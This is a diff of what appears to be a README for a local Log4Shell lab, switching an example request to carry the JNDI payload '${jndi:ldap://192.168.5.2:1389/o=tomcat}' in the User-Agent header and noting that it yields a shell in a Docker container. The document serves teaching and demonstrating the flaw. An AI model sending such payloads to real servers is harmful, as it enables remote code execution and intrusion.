@@ -126,15 +126,9 @@ ${jndi:ldap://192.168.5.2:1389/o=tomcat}
 The vulnerable application has two vulnerable parameters. The exploit can be triggered via the username field or via the `User-Agent` header.
 
 ```http
-POST /login HTTP/1.1
+GET / HTTP/1.1
 Host: localhost:8080
 User-Agent: ${jndi:ldap://192.168.5.2:1389/o=tomcat}
-Content-Type: application/x-www-form-urlencoded
-Origin: http://localhost:8080
-Connection: close
-Referer: http://localhost:8080/
-
-username=log4shell
 ```
 
 We get a shell connection into the Docker container.
